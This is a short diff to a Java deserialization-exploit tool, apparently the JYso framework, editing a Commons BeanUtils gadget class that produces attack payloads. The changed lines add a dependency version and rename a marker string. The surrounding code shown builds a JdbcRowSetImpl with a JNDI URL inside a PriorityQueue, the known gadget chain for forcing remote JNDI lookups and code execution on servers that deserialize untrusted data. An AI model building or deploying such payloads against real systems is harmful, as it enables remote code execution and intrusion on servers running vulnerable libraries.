@@ -14,7 +14,7 @@ import java.util.PriorityQueue;
 import static com.qi4l.JYso.gadgets.Config.Config.POOL;
 import static com.qi4l.JYso.gadgets.utils.InjShell.insertField;
 
-@Dependencies({"commons-beanutils:commons-beanutils:1.8.3"})
+@Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "commons-beanutils:commons-beanutils:1.7X"})
 public class CommonsBeanutils3183 implements ObjectPayload<Object>{
     @Override
     public Object getObject(String command) throws Exception {
@@ -34,7 +34,7 @@ public class CommonsBeanutils3183 implements ObjectPayload<Object>{
 
         JdbcRowSetImpl rs = new JdbcRowSetImpl();
         rs.setDataSourceName(jndiURL);
-        rs.setMatchColumn("su18");
+        rs.setMatchColumn("qi4l");
         PriorityQueue queue = new PriorityQueue(2, comparator);
 
         queue.add(new BigInteger("1"));
